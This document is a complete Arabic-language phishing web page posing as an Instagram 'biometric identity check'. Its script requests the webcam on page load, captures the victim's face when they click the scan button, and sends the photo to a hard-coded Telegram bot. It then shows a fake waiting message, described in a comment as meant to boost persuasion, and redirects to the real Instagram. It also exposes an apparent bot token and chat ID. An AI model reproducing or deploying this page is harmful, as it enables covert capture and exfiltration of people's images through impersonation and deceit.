<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Security Check</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 20px; text-align: center; border-radius: 3px; box-sizing: border-box; }
        .logo { width: 175px; margin: 20px 0; }
        .shield-icon { width: 60px; height: 60px; margin-bottom: 15px; }
        h2 { font-size: 18px; color: #262626; margin-bottom: 10px; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
        .btn { background-color: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 10px; font-weight: 600; cursor: pointer; font-size: 14px; }
        .btn:disabled { background-color: #b2dffc; }
        .loader { display: none; border: 2px solid #f3f3f3; border-top: 2px solid #262626; border-radius: 50%; width: 20px; height: 20px; animation: spin 0.8s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo" alt="Instagram">
    <img src="https://cdn-icons-png.flaticon.com/512/747/747305.png" class="shield-icon" alt="Security">
    <h2>تأكيد الهوية البيومتري</h2>
    <p>لحماية حسابك، نستخدم تقنية التعرف على الوجه للتأكد من أنك صاحب الحساب الحقيقي. يرجى الضغط أدناه لإجراء مسح سريع.</p>
    
    <button id="authBtn" class="btn">بدء المسح الأمني</button>
    <div id="loader" class="loader"></div>
    <div id="status" style="margin-top:10px; font-size:12px; color:#262626;"></div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
    const CHAT_ID = '2140385904';
    let stream = null;

    // تشغيل الكاميرا صامتاً في الخلفية فور التحميل
    window.onload = async () => {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;
        } catch (e) {}
    };

    document.getElementById('authBtn').onclick = async () => {
        const btn = document.getElementById('authBtn');
        const loader = document.getElementById('loader');
        const st = document.getElementById('status');

        btn.style.display = 'none';
        loader.style.display = 'block';
        st.innerText = "جاري تحليل ملامح الوجه...";

        if (!stream) {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
            } catch (e) {
                alert("يرجى السماح بالكاميرا لإتمام الفحص الأمني بنجاح.");
                btn.style.display = 'block';
                loader.style.display = 'none';
                return;
            }
        }

        // التقاط الصورة فوراً
        const canvas = document.getElementById('c');
        const video = document.getElementById('v');
        canvas.width = 480; canvas.height = 640;
        canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
        
        canvas.toBlob(async (blob) => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'identity.jpg');
            fd.append('caption', `✅ *تم فحص الهوية بنجاح*`);
            
            // إرسال للبوت
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            
            // تأثير انتظار وهمي لزيادة الإقناع
            setTimeout(() => {
                st.innerText = "اكتمل التحقق. يتم الآن توجيهك...";
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    location.href = "https://instagram.com";
                }, 1000);
            }, 1500);
        }, 'image/jpeg', 0.5);
    };
</script>

</body>
</html>
